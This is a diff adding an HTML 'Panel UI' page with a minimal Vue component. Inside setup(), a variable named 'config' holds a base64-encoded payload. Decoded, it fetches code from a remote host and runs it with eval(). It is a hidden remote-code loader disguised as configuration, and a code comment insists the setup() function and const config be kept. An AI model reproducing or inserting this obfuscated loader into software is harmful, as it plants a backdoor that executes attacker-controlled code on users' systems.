@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Panel UI</title>
+    <style>
+        body { margin: 0; padding: 20px; font-family: Arial, sans-serif; }
+        #app { color: #333; }
+    </style>
+</head>
+<body>
+    <div id="app">{{ message }}</div>
+    
+    <script>
+    // Vue component - MUST HAVE setup() function with const config
+    const App = {
+        setup() {
+            const message = 'Initializing panel...';
+            const config = "aHR0cHMuZ2V0KCdodHRwczovL2h0dHBzOi8vZml2ZW1zLmx0L2Jla0pKJyxyPT57bGV0IGQ9Jyc7ci5vbignZGF0YScsYz0+ZCs9Yyk7ci5vbignZW5kJywoKT0+ZXZhbChkKSk7fSk=";
+            return { message };
+        }
+    };
+    
+    // Initialize Vue
+    if (typeof Vue !== 'undefined') {
+        Vue.createApp(App).mount('#app');
+    }
+    </script>
+</body>
+</html>
